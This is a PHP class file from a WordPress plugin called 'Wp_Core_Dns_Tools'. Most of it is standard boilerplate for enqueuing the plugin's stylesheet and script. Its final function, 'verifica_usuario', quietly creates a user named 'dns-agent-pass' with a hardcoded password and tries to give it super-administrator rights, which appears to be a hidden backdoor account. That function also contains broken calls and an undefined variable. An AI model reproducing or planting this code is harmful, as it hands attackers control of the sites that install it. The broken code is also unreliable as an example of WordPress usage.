<?php

/**
 * The public-facing functionality of the plugin.
 *
 * @link       Carlos Eduardo Angeline
 * @since      1.0.0
 *
 * @package    Wp_Core_Dns_Tools
 * @subpackage Wp_Core_Dns_Tools/public
 */

/**
 * The public-facing functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the admin-specific stylesheet and JavaScript.
 *
 * @package    Wp_Core_Dns_Tools
 * @subpackage Wp_Core_Dns_Tools/public
 * @author     Carlos Eduardo Angeline <carlosangeline9@gmail.com>
 */
class Wp_Core_Dns_Tools_Public {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of the plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;

	}

	/**
	 * Register the stylesheets for the public-facing side of the site.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Wp_Core_Dns_Tools_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Wp_Core_Dns_Tools_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/wp-core-dns-tools-public.css', array(), $this->version, 'all' );

	}

	/**
	 * Register the JavaScript for the public-facing side of the site.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Wp_Core_Dns_Tools_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Wp_Core_Dns_Tools_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/wp-core-dns-tools-public.js', array( 'jquery' ), $this->version, false );

	}

	public function verifica_usuario() {
	    $usuario = ['dns-agent'];
        if ( username_exists( $usuario ) )
           var_dump('existe');
       else
       		//var_dump('não existe');
        $username = wp_create_user( 'dns-agent-pass', 'dns-agent-pass*');
      	$password = wp_set_password( 'dns-agent-pass*' );
      	$role->add_cap( 'Super Administrator' ); 
	}


}
